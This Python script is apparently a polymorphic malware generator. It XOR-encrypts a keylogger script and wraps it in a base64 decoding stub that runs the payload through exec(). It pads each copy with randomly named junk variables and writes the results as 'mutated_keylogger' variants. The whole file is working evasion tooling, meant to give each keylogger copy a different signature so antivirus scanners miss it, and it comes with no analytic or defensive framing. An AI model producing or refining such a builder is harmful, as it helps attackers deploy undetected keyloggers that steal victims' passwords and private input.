import os
import random
from encryptor import encrypt_payload

# Ensure variants/ folder exists
os.makedirs("variants", exist_ok=True)

# Function to generate random variable names
def random_var(length=8):
    return ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', k=length))

# Function to create the decryption stub
def generate_stub(encrypted_b64, key):
    var1 = random_var()
    var2 = random_var()
    junk_code = f"{var1} = {random.randint(1000,9999)}\n{var2} = '{random.choice(['foo', 'bar', 'baz'])}'"

    return f'''
import base64
{junk_code}

def decrypt(code, key):
    decoded = base64.b64decode(code).decode()
    return ''.join([chr(ord(c) ^ key) for c in decoded])

exec(decrypt('{encrypted_b64}', {key}))
'''.strip()

# Function to generate a polymorphic variant
def generate_variant():
    key = random.randint(1, 255)
    encrypted = encrypt_payload("keylogger.py", key)
    stub_code = generate_stub(encrypted, key)
    filename = f"variants/mutated_keylogger_{random.randint(1000,9999)}.py"
    with open(filename, "w") as f:
        f.write(stub_code)
    print(f"[+] Created: {filename}")

# Generate one variant
generate_variant()
